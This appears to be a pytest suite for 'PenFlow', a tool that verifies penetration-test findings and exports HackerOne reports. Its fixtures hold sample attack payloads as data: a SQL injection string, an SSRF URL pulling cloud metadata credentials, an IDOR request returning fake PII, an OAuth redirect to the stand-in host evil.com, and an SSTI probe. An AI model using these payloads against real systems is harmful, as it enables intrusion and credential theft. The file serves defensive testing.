"""
Golden Positive Regression Test Suite for PenFlow Grounding Engine.

Validates that high-fidelity, authentic vulnerability findings with live HTTP evidence
are certified without false negative rejections by CriticVerificationEngine, receive
correct CVSS v3.1 vectors & CWE classifications, and generate complete HackerOne reports.
"""
import pytest
from penflow.knowledge.evidence_cas import EvidenceBundle
from penflow.validation.critic_engine import CriticVerificationEngine
from penflow.reporting.cvss_calculator import CVSSCalculator
from penflow.reporting.impact_scorer import ImpactScorer
from penflow.reporting.hackerone_exporter import HackerOneReportExporter


@pytest.fixture
def critic_engine():
    return CriticVerificationEngine()


@pytest.fixture
def cvss_calculator():
    return CVSSCalculator()


@pytest.fixture
def impact_scorer():
    return ImpactScorer()


@pytest.fixture
def h1_exporter():
    return HackerOneReportExporter()


def test_golden_positive_1_sqli_error_extraction(critic_engine, cvss_calculator, impact_scorer, h1_exporter):
    """Golden Positive 1: True SQLi with database syntax error and proof trace."""
    bundle = EvidenceBundle(
        hash_id="test_sqli_true_positive",
        vulnerability_type="sqli_vulnerability",
        target="app.example.com",
        raw_traces={
            "target_url": "https://app.example.com/api/products?id=1%27+OR+1%3D1--",
            "is_vulnerable": True,
            "confidence_score": 0.95,
            "reasoning": "SQL syntax error returned in HTTP response confirming query structure manipulation.",
            "evidence_exchanges": [
                {
                    "request": {
                        "method": "GET",
                        "url": "https://app.example.com/api/products?id=1%27+OR+1%3D1--",
                        "headers": {"User-Agent": "PenFlow-Grounding/2.0"}
                    },
                    "response": {
                        "status_code": 500,
                        "headers": {"Content-Type": "application/json"},
                        "body_text": '{"error": "syntax error at or near \\"OR 1=1\\": SELECT * FROM products WHERE id=1\' OR 1=1--"}'
                    }
                }
            ]
        }
    )
    result = critic_engine.verify_finding(bundle)
    assert result["is_verified"] is True
    assert result["confidence"] >= 0.85

    # Verify CVSS & Impact
    metrics = cvss_calculator.get_metrics_for(bundle.vulnerability_type)
    score_info = cvss_calculator.calculate_score(metrics)
    assert score_info["base_score"] >= 8.5

    impact = impact_scorer.evaluate_impact({"vulnerability_type": bundle.vulnerability_type})
    assert impact["cwe"] == "CWE-89"

    # Verify HackerOne export
    report_md = h1_exporter.export_report(result)
    assert "[HIGH]" in report_md
    assert "CWE-89" in report_md
    assert "Raw HTTP Request" in report_md
    assert "syntax error" in report_md


def test_golden_positive_2_ssrf_aws_metadata_leak(critic_engine, cvss_calculator, impact_scorer, h1_exporter):
    """Golden Positive 2: True SSRF leaking cloud metadata IAM keys."""
    bundle = EvidenceBundle(
        hash_id="test_ssrf_true_positive",
        vulnerability_type="ssrf",
        target="api.example.com",
        raw_traces={
            "target_url": "https://api.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
            "is_vulnerable": True,
            "confidence_score": 0.99,
            "reasoning": "AWS instance metadata leaked IAM role credentials through server-side fetch.",
            "evidence_exchanges": [
                {
                    "request": {
                        "method": "GET",
                        "url": "https://api.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
                        "headers": {"Accept": "*/*"}
                    },
                    "response": {
                        "status_code": 200,
                        "headers": {"Content-Type": "application/json"},
                        "body_text": '{"Code": "Success", "AccessKeyId": "ASIAEXAMPLEKEY123", "SecretAccessKey": "secret123", "Token": "tok456"}'
                    }
                }
            ]
        }
    )
    result = critic_engine.verify_finding(bundle)
    assert result["is_verified"] is True
    assert result["confidence"] >= 0.90

    impact = impact_scorer.evaluate_impact({"vulnerability_type": bundle.vulnerability_type})
    assert impact["cwe"] == "CWE-918"

    report_md = h1_exporter.export_report(result)
    assert "CWE-918" in report_md
    assert "ASIAEXAMPLEKEY123" in report_md


def test_golden_positive_3_idor_cross_tenant_pii(critic_engine, cvss_calculator, impact_scorer, h1_exporter):
    """Golden Positive 3: True IDOR extracting victim PII."""
    bundle = EvidenceBundle(
        hash_id="test_idor_true_positive",
        vulnerability_type="idor",
        target="users.example.com",
        raw_traces={
            "target_url": "https://users.example.com/api/v1/profile/9042",
            "is_vulnerable": True,
            "confidence_score": 0.92,
            "reasoning": "Tenant A user token successfully accessed profile data of Tenant B (user 9042).",
            "evidence_exchanges": [
                {
                    "request": {
                        "method": "GET",
                        "url": "https://users.example.com/api/v1/profile/9042",
                        "headers": {"Authorization": "Bearer tenant_a_token"}
                    },
                    "response": {
                        "status_code": 200,
                        "headers": {"Content-Type": "application/json"},
                        "body_text": '{"id": 9042, "email": "victim@tenantb.com", "ssn": "999-00-1111", "balance": 45000}'
                    }
                }
            ]
        }
    )
    result = critic_engine.verify_finding(bundle)
    assert result["is_verified"] is True

    impact = impact_scorer.evaluate_impact({"vulnerability_type": bundle.vulnerability_type})
    assert impact["cwe"] == "CWE-639"

    report_md = h1_exporter.export_report(result)
    assert "CWE-639" in report_md
    assert "victim@tenantb.com" in report_md


def test_golden_positive_4_oauth_account_takeover(critic_engine, cvss_calculator, impact_scorer, h1_exporter):
    """Golden Positive 4: True OAuth redirect_uri hijack to external attacker domain."""
    bundle = EvidenceBundle(
        hash_id="test_oauth_true_positive",
        vulnerability_type="oauth_missing_state",
        target="auth.example.com",
        raw_traces={
            "target_url": "https://auth.example.com/oauth/authorize?client_id=web&redirect_uri=https://evil.com/callback&response_type=code",
            "is_vulnerable": True,
            "confidence_score": 0.95,
            "reasoning": "OAuth authorization endpoint accepted unvalidated external attacker redirect_uri.",
            "evidence_exchanges": [
                {
                    "request": {
                        "method": "GET",
                        "url": "https://auth.example.com/oauth/authorize?client_id=web&redirect_uri=https://evil.com/callback&response_type=code"
                    },
                    "response": {
                        "status_code": 302,
                        "headers": {
                            "Location": "https://evil.com/callback?code=AUTH_SECRET_CODE_9876",
                            "Server": "CloudFront"
                        },
                        "body_text": ""
                    }
                }
            ]
        }
    )
    result = critic_engine.verify_finding(bundle)
    assert result["is_verified"] is True, f"Expected verified finding but was rejected: {result.get('verification_reason')}"

    impact = impact_scorer.evaluate_impact({"vulnerability_type": bundle.vulnerability_type})
    assert impact["cwe"] == "CWE-352"

    report_md = h1_exporter.export_report(result)
    assert "CWE-352" in report_md
    assert "evil.com" in report_md


def test_golden_positive_5_polyglot_ssti_evaluation(critic_engine, cvss_calculator, impact_scorer, h1_exporter):
    """Golden Positive 5: True Polyglot SSTI with mathematical evaluation."""
    bundle = EvidenceBundle(
        hash_id="test_ssti_true_positive",
        vulnerability_type="polyglot_ssti",
        target="template.example.com",
        raw_traces={
            "target_url": "https://template.example.com/render?tpl={{7*7}}",
            "is_vulnerable": True,
            "confidence_score": 0.95,
            "reasoning": "Template syntax evaluated to 49 confirming server-side template execution.",
            "evidence_exchanges": [
                {
                    "request": {
                        "method": "GET",
                        "url": "https://template.example.com/render?tpl={{7*7}}"
                    },
                    "response": {
                        "status_code": 200,
                        "headers": {"Content-Type": "text/html"},
                        "body_text": "<html><body>Hello 49</body></html>"
                    }
                }
            ]
        }
    )
    result = critic_engine.verify_finding(bundle)
    assert result["is_verified"] is True

    impact = impact_scorer.evaluate_impact({"vulnerability_type": bundle.vulnerability_type})
    assert impact["cwe"] == "CWE-1336"

    report_md = h1_exporter.export_report(result)
    assert "CWE-1336" in report_md
    assert "Hello 49" in report_md
